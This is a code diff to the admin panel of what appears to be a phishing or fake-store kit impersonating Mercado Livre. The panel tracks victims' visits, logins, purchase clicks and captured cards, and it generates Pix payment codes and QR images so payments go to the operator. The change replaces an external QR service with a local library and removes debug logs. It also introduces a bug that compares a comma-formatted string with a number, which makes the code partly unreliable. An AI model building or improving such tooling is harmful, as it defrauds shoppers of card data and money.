@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Painel Admin</title>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; background: #0a0e14; color: #e0e0e0; font-size: 14px; min-height: 100vh; }
@@ -141,8 +142,7 @@
         <input type="text" id="nomeRecebedor" placeholder="Seu nome" value="MERCADO LIVRE">
         <label>Cidade</label>
         <input type="text" id="cidadeRecebedor" placeholder="Sua cidade" value="SAO PAULO">
-        <label>Valor (puxado do pedido mais recente)</label>
-        <input type="text" id="valorPixDisplay" readonly style="color:#00ff88;font-weight:bold;">
+        <button onclick="gerarPixConfig()">Salvar Chave Pix</button>
         <div class="pix-preview" id="pixPreview">
           <img id="pixQrPreview" src="" alt="QR Code">
           <input type="text" id="pixCopiaColaPreview" readonly>
@@ -247,31 +247,6 @@
       return limpo.replace(/(.{4})/g, '$1 ').trim();
     }
 
-    function atualizarValorPixDisplay() {
-      const ids = Object.keys(pedidos);
-      const display = document.getElementById('valorPixDisplay');
-      if (ids.length === 0) {
-        display.value = 'Aguardando pedido...';
-        return;
-      }
-      // Pega o pedido com valor > 0 mais recente
-      let ultimo = null;
-      let ultimoTs = 0;
-      ids.forEach(id => {
-        const p = pedidos[id];
-        const ts = p.clicouComprarEm || p.logadoEm || 0;
-        if (p.valor > 0 && ts > ultimoTs) {
-          ultimo = p;
-          ultimoTs = ts;
-        }
-      });
-      if (ultimo) {
-        display.value = 'R$ ' + ultimo.valor.toFixed(2).replace('.', ',');
-      } else {
-        display.value = 'Aguardando pedido...';
-      }
-    }
-
     function renderPedidos() {
       const tbody = document.getElementById('corpoPedidos');
       const ids = Object.keys(pedidos);
@@ -290,8 +265,7 @@
         const pixCopiado = p.pix && p.pix.copiado;
         const pixCopiadoEm = p.pix && p.pix.copiadoEm;
         const podeConfirmar = pixCopiado && (agora - pixCopiadoEm >= 10000) && p.status !== 'pago';
-        const valorNum = p.valor || 0;
-        const valor = valorNum.toFixed(2).replace('.', ',');
+        const valor = (p.valor || 0).toFixed(2).replace('.', ',');
 
         let statusTxt = 'Só visitou';
         let statusClass = 'pendente';
@@ -315,8 +289,7 @@
           `;
         }
 
-        // Botão Pix só aparece se o pedido tem valor > 0
-        const btnPix = valorNum > 0
+        const btnPix = valor > 0
           ? `<button class="btn-pix" onclick="gerarPixPedido('${id}')">💠 Gerar Pix (R$ ${valor})</button>`
           : '<div class="detalhes">Sem valor definido</div>';
 
@@ -372,7 +345,7 @@
         stats = { online: 0, visitas: 0, cliques: 0, pix: 0, copiados: 0, cartoes: 0, valor: 0 };
         pedidos = {}; visitasMap = {};
         window._ultimoAlertaCount = 0;
-        atualizarCards(); renderPedidos(); renderAlertas([]); atualizarValorPixDisplay();
+        atualizarCards(); renderPedidos(); renderAlertas([]);
         alert('✅ Tudo limpo com sucesso!');
       }).catch(err => alert('❌ Erro ao limpar: ' + err.message));
     }
@@ -401,20 +374,17 @@
       const valor = parseFloat(p.valor) || 0;
       if (valor <= 0) { alert('❌ Este pedido não tem valor definido.'); return; }
 
-      // DEBUG: mostra o valor que está sendo usado
-      console.log('🔍 Gerando Pix com valor:', valor, 'do pedido', id);
-
       try {
         const copiaECola = gerarPayloadPix(chave, nome, cidade, valor);
-        const qrCodeUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(copiaECola);
+        const qrCode = await QRCode.toDataURL(copiaECola, { width: 300, margin: 2 });
 
-        document.getElementById('pixQrPreview').src = qrCodeUrl;
+        document.getElementById('pixQrPreview').src = qrCode;
         document.getElementById('pixCopiaColaPreview').value = copiaECola;
         document.getElementById('pixPreview').style.display = 'block';
 
         await db.ref('pixConfig').update({
           chave: copiaECola,
-          qrCode: qrCodeUrl,
+          qrCode: qrCode,
           valor: valor.toFixed(2).replace('.', ','),
           nome: nome,
           cidade: cidade,
@@ -422,7 +392,7 @@
           atualizadoEm: Date.now()
         });
 
-        alert('✅ Pix de R$ ' + valor.toFixed(2).replace('.', ',') + ' gerado!\n\nPedido: ' + id);
+        alert('✅ Pix de R$ ' + valor.toFixed(2).replace('.', ',') + ' gerado para o pedido ' + id + '!');
       } catch(e) {
         alert('❌ Erro ao gerar Pix: ' + e.message);
       }
@@ -481,13 +451,7 @@
         });
         stats.cliques = cliques; stats.pix = pix; stats.copiados = copiados;
         stats.cartoes = cartoes; stats.valor = valor;
-        atualizarCards(); renderPedidos(); atualizarValorPixDisplay();
-
-        // Log para debug
-        console.log('📦 Pedidos:', Object.keys(pedidos).length);
-        Object.entries(pedidos).forEach(([id, p]) => {
-          console.log(`  Pedido ${id}: valor = ${p.valor}`);
-        });
+        atualizarCards(); renderPedidos();
       });
 
       db.ref('alertas').limitToLast(30).on('value', snap => {
